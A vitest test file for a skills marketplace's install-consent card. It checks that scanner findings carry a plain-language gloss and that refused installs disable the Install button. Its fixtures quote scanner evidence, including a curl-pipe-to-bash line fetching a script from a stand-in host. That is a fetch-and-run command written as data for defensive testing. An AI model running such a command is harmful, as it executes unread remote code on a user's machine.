// @vitest-environment jsdom
import { describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { ruleGloss, SCAN_RULE_GLOSS } from './scanFindings'

// ── Every surface that lists a scan finding says what the rule MEANS (#2535) ─────────────────────
//
// The app-install card and the skills marketplace ask the user the SAME question — "install this
// third-party code, on a scanner verdict, having read a list of findings?" — and #2534 answered it
// on one of them. The other went on rendering `python_exec in scripts/fetch.py`: the scanner's
// vocabulary and a file path, with nothing a non-expert can weigh. `ruleGloss` was already exported
// and already coverage-pinned in Python; the only thing missing was the second import.
//
// 🔑 THIS RAIL IS POPULATION-KEYED, because "a second consumer was missed" is the whole issue. The
// expected set is DERIVED by walking web/src for anything that renders a finding's `rule`, not
// hand-listed — a third consent surface joins the population the moment it lands, and reds until it
// glosses. A hand-list would have passed on the day #2535 was filed.
//
// 🪤 VACUITY, BOTH WAYS. A census that matches zero files is green and worthless, so the population
// carries a floor. But `toBeGreaterThanOrEqual(2)` on the derived count is not a floor — it is the
// same regex vouching for itself, and if the regex silently stops matching, the count and the
// expectation fail together in the wrong direction. So the lower bound is asserted a SECOND way that
// shares no parse with the derivation: the two known consumer files are named, read, and each
// checked for `.rule` and `ruleGloss` directly. If the walker breaks, that assertion still holds the
// floor; if the walker works but a file drops its gloss, the census catches it.
//
// 🪤 KEYED ON `.rule` OFF A FINDING, not on the word "findings". `chat/SdlcProgressCard`,
// `code/CodeCockpitPage`, `loops/*` and `workflows/ReviewTriagePanel` all render a `findings` array
// — an SDLC/loop REVIEW finding, a different concept wearing the same noun. Glossing those with a
// supply-chain rule map would be a non-defect "fix".
//
// 🪤 NOT PINNED HERE: `cli.py:1681` (`personalclaw skills install`) prints the same
// `[severity] rule in path: evidence` row on a refusal and carries NO gloss, because this map is
// TypeScript and the CLI is Python. Duplicating the sentences there is precisely the defect this
// change removes (two answers to one question), and single-sourcing them across the language
// boundary is an architecture call, not a wiring one. It is reported in the PR, deliberately not
// papered over with a second map and deliberately not pinned green.

const SRC = join(process.cwd(), 'src')
const strip = (t: string) => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')
const walk = (d: string): string[] =>
  readdirSync(d).flatMap((n: string) => {
    const p = join(d, n)
    if (statSync(p).isDirectory()) return walk(p)
    return /\.tsx?$/.test(n) && !/\.test\.tsx?$/.test(n) ? [p] : []
  })

/** The two consumers known on the day this landed. Named, not derived — the independent floor. */
const KNOWN = ['pages/apps/installConsent.tsx', 'pages/skills/MarketplaceDetail.tsx']

describe('the derived population of finding renderers', () => {
  it('is not empty, by a bound that does not share the census parse', () => {
    // Read the two files by NAME and assert the property directly. This cannot go vacuous with the
    // walker: if `walk`/the regex break, this still fails when a consumer stops glossing.
    for (const rel of KNOWN) {
      const src = strip(readFileSync(join(SRC, rel), 'utf8'))
      expect(src, `${rel} must render a finding's rule`).toMatch(/\{\s*f\.rule\s*\}/)
      expect(src, `${rel} must gloss it`).toMatch(/\bruleGloss\(/)
      expect(src, `${rel} must take the gloss from the shared module`).toMatch(
        /import \{[^}]*\bruleGloss\b[^}]*\} from '(\.\.\/)+lib\/scanFindings'/,
      )
    }
  })

  it('every file that renders a finding rule also glosses it — the census', () => {
    const renderers = walk(SRC)
      .map((abs) => ({ rel: abs.replace(SRC + '/', ''), src: strip(readFileSync(abs, 'utf8')) }))
      .filter(({ src }) => /\{\s*f\.rule\s*\}/.test(src) && /\.findings\b/.test(src))
    expect(renderers.map((r) => r.rel).sort(), 'the census must find both known consumers')
      .toEqual(expect.arrayContaining(KNOWN))
    const unglossed = renderers.filter(({ src }) => !src.includes('ruleGloss(')).map((r) => r.rel)
    expect(unglossed, 'a rule name shown without its meaning is not a disclosure').toEqual([])
  })

  it('no surface writes a SECOND answer to what a rule means', () => {
    // A local map keyed by rule name is the defect shape #2535 removes: two glosses drift, and the
    // user comparing two install surfaces has no way to know which one is current.
    const others = walk(SRC)
      .map((abs) => ({ rel: abs.replace(SRC + '/', ''), src: strip(readFileSync(abs, 'utf8')) }))
      .filter(({ rel, src }) => rel !== 'lib/scanFindings.ts' && /python_exec\s*:/.test(src))
    expect(others.map((r) => r.rel), 'the gloss vocabulary lives in lib/scanFindings only').toEqual([])
  })
})

describe('the gloss is surface-neutral', () => {
  it('never names one of the two surfaces that ask', () => {
    // The map shipped with one consumer and every sentence said "The app …", which rendered as
    // "The app runs an external program on your machine." on a SKILL install card. A finding is
    // located in a file on both surfaces, so the code is the subject that is true for both.
    const named = Object.entries(SCAN_RULE_GLOSS).filter(([, t]) => /\bThe app\b|\bthis app\b/i.test(t))
    expect(named.map(([r]) => r), 'one map, so no sentence may name a single consumer').toEqual([])
  })

  it('an unknown rule yields nothing rather than echoing itself', () => {
    expect(ruleGloss('a_rule_this_build_never_heard_of')).toBe('')
    expect(ruleGloss('python_exec')).toContain('external program')
  })
})

// ── What the skills consent card actually renders ────────────────────────────────────────────────

// The literal `/api/skills/install` bodies — `overridable`, not `needsConsent`, because
// `guardedFromSkill` is what maps the wire and a fixture in the internal shape would test the
// component against a payload the server never sends. Both were copied from a real 409/403 body
// captured off a running gateway (`local-demo` marketplace, `scripts/fetch.py`).
const warned = {
  ok: false,
  overridable: true,
  verdict: 'warning',
  error: 'skill install needs confirmation (warning): python_exec',
  scan: {
    verdict: 'warning', tier: 'community',
    findings: [{
      surface: 'script', severity: 'warning', rule: 'python_exec',
      path: 'scripts/fetch.py', evidence: 'L6: subprocess.run(["curl", "-sSL", url])',
    }],
  },
}
const refusedResult = {
  ok: false,
  overridable: false,
  verdict: 'dangerous',
  error: 'skill install refused (dangerous, non-overridable): remote_exec_pipe',
  scan: {
    verdict: 'dangerous', tier: 'community',
    findings: [{
      surface: 'script', severity: 'dangerous', rule: 'remote_exec_pipe',
      path: 'scripts/bootstrap.sh', evidence: 'L2: curl -sSL https://x.invalid/i.sh | bash',
    }],
  },
}
// An unglossed rule name, to prove the row survives a vocabulary this build has not met.
const unknownRule = {
  ok: false, overridable: true, verdict: 'warning', error: 'warning',
  scan: {
    verdict: 'warning', tier: 'community',
    findings: [{ surface: 'script', severity: 'warning', rule: 'zzz_future_rule', path: 'a.py', evidence: '' }],
  },
}

let outcome: unknown = warned
vi.mock('./api', () => ({
  api: {
    installSkill: () => Promise.resolve(outcome),
    skillMarketplaceDetail: () => Promise.resolve({
      id: 'acme/report-digest', name: 'report-digest', files: [], body: '# d',
      frontmatter: { name: 'report-digest', always: 'true', 'allowed-tools': 'Read, Bash' },
    }),
  },
}))

// Imported after the mock so the component binds it.
const { MarketplaceDetail } = await import('../pages/skills/MarketplaceDetail')

const result = { id: 'acme/report-digest', name: 'report-digest', description: 'd', source: 'local-demo' }

async function drive(o: unknown) {
  outcome = o
  render(<MarketplaceDetail result={result as never} installed={false} onInstalled={() => {}} />)
  const btn = await screen.findByRole('button', { name: /^Install$/ })
  btn.click()
  await waitFor(() => expect(document.querySelector('[role=alert]')).toBeTruthy())
  return document.querySelector('[role=alert]') as HTMLElement
}

describe('the skills marketplace consent card', () => {
  it('adds the meaning WITHOUT taking away the technical row', async () => {
    const card = await drive(warned)
    const text = card.textContent || ''
    // Both, on one row. A "fix" that replaced the rule name with prose would hide the only thing
    // comparable against the scanner's own output, which is a worse bug than the one being fixed.
    expect(text, 'the scanner rule is still named').toContain('python_exec')
    expect(text, 'and still located').toContain('scripts/fetch.py')
    expect(text, 'and now explained').toContain('This code runs an external program on your machine.')
    expect(text, 'the severity is untouched').toMatch(/warning/i)
    // 🪤 The sentence must READ as prose, and two mutants survived the first battery proving
    // nothing held that: dropping `font-sans` left the explanation in the row's `font-mono`
    // (a sentence in a code face reads as more evidence, which is the defect wearing a
    // different costume), and dropping `data-type` left it inheriting the row's raw 0.75rem,
    // off the type scale the rest of the app sits on.
    const gloss = card.querySelector('span[data-type="body-s"]')
    expect(gloss, 'the gloss sits on a type role, not the row\'s raw size').toBeTruthy()
    expect(gloss!.className, 'and in the prose face, not the row\'s mono').toMatch(/\bfont-sans\b/)
  })

  it('glosses a DANGEROUS finding too — a refusal is owed its reason most of all', async () => {
    const card = await drive(refusedResult)
    const text = card.textContent || ''
    expect(text).toContain('remote_exec_pipe')
    expect(text).toContain('This code downloads more code from the internet and runs it immediately, unread.')
    expect(text, 'the terminal sentence stays').toMatch(/cannot be installed, even with override/)
  })

  it('a rule this build has no gloss for still shows the row, with no empty line', async () => {
    const card = await drive(unknownRule)
    const text = card.textContent || ''
    expect(text).toContain('zzz_future_rule')
    // No stray empty element: the gloss is gated on there being one.
    expect(card.querySelectorAll('span[data-type="body-s"]').length).toBe(0)
  })
})

describe('a refused install stops offering itself', () => {
  it('disables the primary Install on a terminal verdict, with the reason', async () => {
    // #2527's shape, as an affordance rather than a sentence: the card said "It cannot be
    // installed, even with override" while the Install button above it stayed live.
    await drive(refusedResult)
    const btn = await screen.findByRole('button', { name: /^Install$/ })
    // `aria-disabled`, not native `disabled`: `Button` keeps a control with a REASON in the tab
    // order so the reason is reachable, and refuses the click itself (`softOff`). Asserting
    // `.disabled` here would have read the fix as absent.
    expect(btn.getAttribute('aria-disabled'), 'a refused install is not on offer').toBe('true')
    expect(btn.getAttribute('title') || '', 'and says why').toMatch(/cannot be overridden/)
  })

  it('leaves it enabled on a consentable warning — that install is still possible', async () => {
    await drive(warned)
    const btn = await screen.findByRole('button', { name: /^Install$/ })
    expect(btn.getAttribute('aria-disabled')).toBeNull()
    expect((btn as HTMLButtonElement).disabled).toBe(false)
  })
})

describe('what the skill declares reaches the same surface as the button', () => {
  it('states the always-on load and the tools the author named', async () => {
    await drive(warned)
    const body = document.body.textContent || ''
    // `always: true` is enforced (`SkillsLoader.get_always_skills`) and the INSTALLED surfaces
    // already show it; before this the marketplace panel showed it nowhere, so the user learned
    // it only after consenting.
    expect(body).toMatch(/Loads into every session automatically/)
    expect(body).toMatch(/Read, Bash/)
    // And the floor that must be said either way: a skill is not sandboxed by its own list.
    expect(body).toMatch(/does not confine a skill to the tools it names/)
  })
})
